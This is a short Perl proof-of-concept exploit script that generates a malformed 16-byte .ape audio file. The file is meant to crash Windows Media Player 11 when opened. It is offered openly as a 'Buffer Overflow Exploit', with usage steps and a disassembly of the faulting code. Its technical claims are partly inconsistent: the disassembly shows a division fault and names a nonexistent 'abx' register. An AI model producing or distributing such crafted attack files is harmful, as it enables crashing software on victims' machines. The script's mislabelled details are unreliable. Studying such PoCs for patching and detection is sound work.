#!/usr/bin/perl

###
# Title : Windows Media Player v11.0 (.ape) Buffer Overflow
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : Windows 
# Impact : Overflow in 'wmplayer.exe' Process
# Tested on : Windows XP SP3 Fran.ais 
# Target : Windows Media Player v11.0
###
# Note : BAC 2011 Enchallah ( KedAns 'me' & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
# ------------
# Usage : 1 - Creat APE file ( Monkey's Audio Format )
#      =>    2 - Open APE file With Windows Media Player v11.0
#      =>    3 -  OverFlow !!!
# Assembly Error in [MonkeySource.ax] ! 022351a6() ! :
# 0x022351a3 ,0xc2 0x08 0x00 [ret] || 8
# 0x022351a6 ,0xf7 0xf3 [div] || eax,abx << (" Error Here ")
# 0x022351a8 ,0x31 0xd2 [xor] || edx,edx
# 0x022351aa ,0xeb 0xf3 [jmp] || 0x0223519f
# 0x022351ac ,0xc3 [ret] || 
# ------------
#START SYSTEM /root@MSdos/ :
system("title KedAns-Dz");
system("color 1e");
system("cls");
print "\n\n";                  
print "    |=======================================================|\n";
print "    |= [!] Name : Windows Media Player v11.0 || .APE File  =|\n";
print "    |= [!] Exploit : Buffer Overflow Exploit               =|\n";
print "    |= [!] Author : KedAns-Dz                              =|\n";
print "    |= [!] Mail: Ked-h(at)hotmail(dot)com                  =|\n";
print "    |=======================================================|\n";
sleep(2);
print "\n";
# Creating ...
my $PoC = "\x4D\x41\x43\x20\x96\x0f\x00\x00\x34\x00\x00\x00\x18\x00\x00\x00"; # APE Header
open(file , ">", "Kedans.ape"); # Evil File APE (16 bytes) 4.0 KB
print file $PoC;  
print "\n [+] File successfully created!\n" or die print "\n [-] OpsS! File is Not Created !! ";
close(file);
